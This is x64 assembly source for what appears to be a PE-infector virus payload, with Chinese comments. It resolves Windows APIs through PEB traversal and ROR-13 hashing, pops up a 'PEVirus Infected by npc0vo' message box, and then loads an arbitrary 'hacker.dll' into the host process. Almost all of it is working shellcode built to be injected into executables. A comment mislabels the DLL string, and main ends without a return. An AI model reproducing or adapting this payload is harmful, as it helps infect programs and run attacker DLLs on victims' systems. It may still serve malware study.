.code

GetProcAddressByHash:
    
    ; 1. 保存前4个参数到栈上，并保存rsi的值
    push r9
    push r8
    push rdx
    push rcx
    push rsi

    ; 2. 获取 InMemoryOrderModuleList 模块链表的第一个模块结点
    xor rdx,rdx										; 清零
    mov rdx,gs:[rdx+60h]					; 通过GS段寄存器获取PEB地址（TEB偏移0x60处）
    mov rdx,[rdx+18h]							; PEB->Ldr
    mov rdx,[rdx+20h]							; 第一个模块节点，也是链表InMemoryOrderModuleList的首地址

    ;3.模块遍历
next_mod:
    mov rsi,[rdx+50h]                 			; 模块名称
    movzx rcx,word ptr [rdx+48h]	  	; 模块名称长度
    xor r8,r8                         					; 存储接下来要计算的hash

    ; 4.计算模块hash
loop_modname:
    xor rax, rax										; 清零EAX，准备处理字符
    lodsb												; 从rSI加载一个字节到AL（自动递增rSI）
    cmp al,'a'											; 比较当前字符的ASCII值是否小于小写字母'a'(0x61)
    jl not_lowercase								; 如果字符 < 'a'，说明不是小写字母，跳转不处理
    sub al, 20h										; 若字符在'a'-'z'范围内，通过减0x20转换为大写字母（'A'-'Z'）
not_lowercase:
    ror r8d,0dh										; 对R8的低32位进行循环右移13位，不影响高32位
    add r8d,eax									; 将当前字符的ASCII值（已大写化）累加到哈希值
    dec ecx											; 字符计数器ECX减1
    jnz loop_modname						; 继续循环处理下一个字符，直到ECX减至0
    push rdx											; 将当前模块链表节点地址压栈    
    push r8											; 将计算完成的哈希值压栈存储hash值

    ; 5.获取导出表
    mov rdx, [rdx+20h]						; 获取模块基址
    mov eax, dword ptr [rdx+3ch]		; 读取PE头的RVA
    add rax, rdx									; PE头VA
    cmp word ptr [rax+18h],20Bh		; 检查是否为PE64文件
    jne get_next_mod1							; 不是就下一个模块
    mov eax, dword ptr [rax+88h]		; 获取导出表的RVA
    test rax, rax									; 检查该模块是否有导出函数
    jz get_next_mod1							; 没有就下一个模块
    add rax, rdx									; 获取导出表的VA
    push rax											; 存储导出表的地址
    mov ecx, dword ptr [rax+18h]		; 按名称导出的函数数量
    mov r9d, dword ptr [rax+20h]		; 函数名称字符串地址数组的RVA
    add r9, rdx										; 函数名称字符串地址数组的VA

    ; 6.获取函数名	
get_next_func:	
    test rcx, rcx									; 检查按名称导出的函数数量是否为0
    jz get_next_mod							; 若所有函数已处理完，跳转至下一个模块遍历
    dec rcx											; 函数计数器递减（从后向前遍历函数名数组）
    mov esi, dword ptr [r9+rcx*4]		; 从末尾往前遍历，一个函数名RVA占4字节
    add rsi, rdx										; 函数名RVA
    xor r8, r8											; 存储接下来的函数名哈希

    ; 7.计算模块 hash + 函数 hash之和
loop_funcname: 
    xor rax, rax										; 清零EAX，准备处理字符
    lodsb												; 从rsi加载一个字节到al，rsi自增1
    ror r8d,0dh										; 对当前哈希值（r8d）循环右移13位
    add r8d,eax									; 将当前字符的ASCII值（al）累加到哈希值（r8d）
    cmp al, ah										; 检查当前字符是否为0（字符串结束符）
    jne loop_funcname						; 若字符非0，继续循环处理下一个字符
    add r8,[rsp+8]								; 将之前压栈的模块哈希值（位于栈顶+8）加到当前函数哈希
    cmp r8d,r10d									; r10存储目标hash
    jnz get_next_func

    ; 8.获取目标函数指针
    pop rax											; 获取之前存放的当前模块的导出表地址
    mov r9d, dword ptr [rax+24h]		; 获取序号表（AddressOfNameOrdinals）的 RVA
    add r9, rdx										; 序号表起始地址
    mov cx, [r9+2*rcx]							; 从序号表中获取目标函数的导出索引
    mov r9d, dword ptr [rax+1ch]		; 获取函数地址表（AddressOfFunctions）的 RVA
    add r9, rdx										; AddressOfFunctions数组的首地址
    mov eax, dword ptr [r9+4*rcx]		; 获取目标函数指针的RVA
    add rax, rdx									; 获取目标函数指针的地址

finish:
    pop r8												; 清除当前模块hash
    pop r8												; 清除当前链表的位置
    pop rsi												; 恢复RSI
    pop rcx											; 恢复第一个参数
    pop rdx											; 恢复第二个参数
    pop r8												; 恢复第三个参数
    pop r9												; 恢复第四个参数
    pop r10											; 将返回地址地址存储到r10中
    sub rsp, 20h									; 给前4个参数预留 4*8=32（20h）的影子空间
    push r10											; 返回地址
    jmp rax											; 调用目标函数

get_next_mod:                 
  pop rax                     						; 弹出栈中保存的导出表地址
get_next_mod1:                
  pop r8                      							; 弹出之前压栈的计算出来的模块哈希值
  pop rdx                    							; 弹出之前存储在当前模块在链表中的位置
  mov rdx, [rdx]              						; 获取链表的下一个模块节点（FLINK）
  jmp next_mod                					; 跳转回模块遍历循环

main proc
    mov r15, rsp					; 保存初始栈指针
    push rax
    push rcx
    push rdx
    push rbx 
    push rbp
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14

    sub rsp, 200h				
    ; 1.清楚反向标准，并对齐rsp
    cld														; 清除方向标志，确保字符串操作方向向前
    and rsp, 0FFFFFFFFFFFFFFF0h		; 将栈指针（RSP）对齐到16字节边界，满足Windows x64调用约定要求。

    ; 2.加载user32.dll
    push 0													; 为了对齐 
    mov r14,0000323372657375h			; "user32\0",或者使用下面的指令
    ;mov r14, '23resu'
    push r14												; 字符串压栈，此时rsp指向"user32\0"字符串
    mov rcx,rsp										; RCX=字符串指针
    mov r10,0DEC21CCDh						; kernel32.dll+LoadLibraryA hash
    call GetProcAddressByHash

    ; 3.调用MessageBoxA
    sub rsp, 40h                        ; 分配栈空间并保持16字节对齐
    
    ; 在栈上构建字符串 "PEVirus Infected by npc0vo"
    lea rdx, [rsp+20h]                  ; RDX指向字符串缓冲区
    
    ; "PEVirus Infected by npc0vo" 总共26个字符
    
    mov byte ptr [rdx], 50h      ; 'P'
    mov byte ptr [rdx+1], 45h    ; 'E'
    mov byte ptr [rdx+2], 56h    ; 'V'
    mov byte ptr [rdx+3], 69h    ; 'i'
    mov byte ptr [rdx+4], 72h    ; 'r'
    mov byte ptr [rdx+5], 75h    ; 'u'
    mov byte ptr [rdx+6], 73h    ; 's'
    mov byte ptr [rdx+7], 20h    ; ' '
    mov byte ptr [rdx+8], 49h    ; 'I'
    mov byte ptr [rdx+9], 6Eh    ; 'n'
    mov byte ptr [rdx+10], 66h   ; 'f'
    mov byte ptr [rdx+11], 65h   ; 'e'
    mov byte ptr [rdx+12], 63h   ; 'c'
    mov byte ptr [rdx+13], 74h   ; 't'
    mov byte ptr [rdx+14], 65h   ; 'e'
    mov byte ptr [rdx+15], 64h   ; 'd'
    mov byte ptr [rdx+16], 20h   ; ' '
    mov byte ptr [rdx+17], 62h   ; 'b'
    mov byte ptr [rdx+18], 79h   ; 'y'
    mov byte ptr [rdx+19], 20h   ; ' '
    mov byte ptr [rdx+20], 6Eh   ; 'n'
    mov byte ptr [rdx+21], 70h   ; 'p'
    mov byte ptr [rdx+22], 63h   ; 'c'
    mov byte ptr [rdx+23], 30h   ; '0'
    mov byte ptr [rdx+24], 76h   ; 'v'
    mov byte ptr [rdx+25], 6Fh   ; 'o'
    mov byte ptr [rdx+26], 0     ; 字符串结束符
    
    mov rcx, 0                          ; hWnd = NULL
    ; rdx已经指向字符串                    ; lpText
    mov r8, 0                           ; lpCaption = NULL
    mov r9, 0                           ; uType = MB_OK
    mov r10, 790E24F0h                  ; MessageBoxA的哈希值
    call GetProcAddressByHash
    
    add rsp, 40h                        ; 恢复栈指针

    and rsp, 0FFFFFFFFFFFFFFF0h
    push 0
    ; 4. 尝试加载hacker.dll						
    mov r14,0072656b636168h			; "user32\0",或者使用下面的指令
    push r14												; 字符串压栈，此时rsp指向"hacker\0"字符串
    mov rcx,rsp										; RCX=字符串指针
    mov r10,0DEC21CCDh						; kernel32.dll+LoadLibraryA hash
    call GetProcAddressByHash

    mov rsp, r15					; 恢复初始栈指针
    mov r15, 0
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbp
    pop rbx
    pop rdx
    pop rcx
    pop rax
main endp
end